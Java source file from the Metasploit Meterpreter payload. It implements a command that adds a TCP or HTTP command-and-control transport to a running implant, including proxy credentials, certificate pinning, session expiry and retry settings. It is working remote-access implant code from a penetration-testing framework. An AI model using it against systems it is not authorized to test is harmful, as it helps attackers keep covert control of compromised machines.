package com.metasploit.meterpreter.core;

import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.Transport;
import com.metasploit.meterpreter.TcpTransport;
import com.metasploit.meterpreter.HttpTransport;
import com.metasploit.meterpreter.command.Command;

public class core_transport_add implements Command {

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        Transport t = null;
        String transportUrl = request.getStringValue(TLVType.TLV_TYPE_TRANS_URL);

        if (transportUrl.startsWith("tcp")) {
            t = new TcpTransport(meterpreter, transportUrl);
        } else {
            HttpTransport h = new HttpTransport(meterpreter, transportUrl);

            // do the HTTP specific stuff here, since we know what we are
            h.setUserAgent(request.getStringValue(TLVType.TLV_TYPE_TRANS_UA, ""));
            h.setProxy(request.getStringValue(TLVType.TLV_TYPE_TRANS_PROXY_HOST, ""));
            h.setProxyUser(request.getStringValue(TLVType.TLV_TYPE_TRANS_PROXY_USER, ""));
            h.setProxyPass(request.getStringValue(TLVType.TLV_TYPE_TRANS_PROXY_PASS, ""));
            h.setCertHash(request.getRawValue(TLVType.TLV_TYPE_TRANS_CERT_HASH, null));

            t = h;
        }

        // set the timeouts, defaulting the values that are currently set
        // for the current sesion if nothing has been specified
        try {
            long sessionExpiry = request.getIntValue(TLVType.TLV_TYPE_TRANS_SESSION_EXP);
            meterpreter.setExpiry(sessionExpiry);
        }
        catch (IllegalArgumentException ignored) {
        }

        try {
            long commTimeout = request.getIntValue(TLVType.TLV_TYPE_TRANS_COMM_TIMEOUT);
            t.setCommTimeout(commTimeout);
        }
        catch (IllegalArgumentException ex) {
            t.setCommTimeout(meterpreter.getTransports().current().getCommTimeout());
        }

        try {
            long retryTotal = request.getIntValue(TLVType.TLV_TYPE_TRANS_RETRY_TOTAL);
            t.setRetryTotal(retryTotal);
        }
        catch (IllegalArgumentException ex) {
            t.setRetryTotal(meterpreter.getTransports().current().getRetryTotal());
        }

        try {
            long retryWait = request.getIntValue(TLVType.TLV_TYPE_TRANS_RETRY_WAIT);
            t.setRetryWait(retryWait);
        }
        catch (IllegalArgumentException ex) {
            t.setRetryWait(meterpreter.getTransports().current().getRetryWait());
        }

        meterpreter.getTransports().add(t);

        return ERROR_SUCCESS;
    }
}

